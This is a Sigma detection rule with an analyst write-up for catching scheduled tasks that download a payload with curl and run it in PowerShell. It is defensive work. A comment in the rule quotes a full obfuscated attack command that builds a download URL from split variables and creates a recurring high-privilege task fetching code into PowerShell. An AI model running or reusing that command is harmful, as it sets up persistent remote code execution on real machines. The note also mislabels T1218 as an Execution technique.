logsource:
  category: process_creation
  product: windows
detection:
    # Example: cmd start /min /c schtasks /create /tn PolicyConverter /sc minute /mo 15 /tr "conhost --headless cmd /v:on /c set a=https&set b=inh&set c=ostne&set d=tservice.co&set e=!a!://www.!b!!c!!d!m& curl -o - !e!/mscu/lokc.php?wl=HGNBWBGW**Admin | powershell" /rl Highest
  selection_img:
    Image|endswith: '\schtasks.exe'
    CommandLine|contains|windash: ' /create '
  selection_curl:
    CommandLine|contains|all:
    - 'curl '
    - 'http'
    - '-o'
  selection_powershell:
    CommandLine|contains: 'powershell'
  condition: all of selection_*
falsepositives:
- Legitimate use of schtasks for administrative purposes.
- Automation scripts combining curl and PowerShell in controlled environments.
level: medium
note: |
  ### Technical Context

  This Sigma rule detects the creation of a scheduled task using `schtasks.exe` in conjunction with `curl` for downloading payloads and `PowerShell` for execution. The rule targets a technique often used by attackers to execute malicious scripts or facilitate command-and-control (C&C) persistence without directly deploying the payload on the host system. The relevant MITRE ATT&CK tactics include Persistence (T1053.005) and Execution (T1218), which describe scenarios of establishing and maintaining access alongside executing scripts.

  The primary telemetry source is Windows process creation events, specifically looking for Event ID 4688 in Security logs or Sysmon Event ID 1. If the activity is confirmed as malicious, it can lead to unauthorized execution of code, potential data exfiltration, and long-term persistence on the affected systems. It is crucial to note that this detection does NOT confirm malicious activity on its own, as legitimate administrative actions may trigger similar behaviors.

  ### Investigation Steps

  - **Review scheduled tasks:**
    Check scheduled tasks on the affected system using PowerShell command `Get-ScheduledTask` or Event ID 4698 in Security logs. Look for unusual task names and execution triggers that deviate from standard operational procedures.

  - **Analyze process creation logs:**
    Examine Security Event ID 4688 and Sysmon Event ID 1 for instances where `schtasks.exe` is called with the ` /create ` parameter. Correlate these with any known administrators to distinguish legitimate task creations from suspicious ones.

  - **Verify command line arguments:**
    Investigate the CommandLine field for the specific task, ensuring it does not contain parameters that call external resources or use `curl` to download files. Legitimate tasks typically do not include calls to `curl` or similar downloading utilities.

  - **Identify PowerShell usage:**
    Check for any PowerShell execution logs linked with the scheduled task creation, focusing on Event ID 400 for PowerShell logs. Review any associated commands for known malicious indicators like encoded commands or suspicious URLs.

  - **Cross-reference with network activity:**
    Validate whether the system attempted connections to known malicious domains or IPs during the timeframe the scheduled task was created. Utilize DNS logs and proxy logs to confirm automated connections during or shortly after the task creation.

  - **Establish high-confidence malicious indicators:**
    Look for the usage of `curl` to download from unusual URLs, particularly those that redirect through several domains or contain obfuscated parameters. This may indicate that a malicious payload is being fetched for execution.

  ### Prioritization

  This alert carries medium severity due to the potential for significant impact on systems that host sensitive data or serve critical functions. Scheduled task creation is a common tactic used by adversaries for persistence, and the combination of `curl` and `PowerShell` for executing downloaded payloads is frequently weaponized in various attacks.

  ### Blind Spots and Assumptions

  Detection may be limited if logging is not consistently enabled for process creation or if PowerShell script block logging isn't active. Legitimate administrative tasks, particularly in automation scripts, could trigger false positives due to the use of `schtasks.exe`, `curl`, and `PowerShell`. Additional detection, such as monitoring for high-frequency PowerShell executions or abnormal outbound network traffic, could strengthen the overall coverage against these threats.

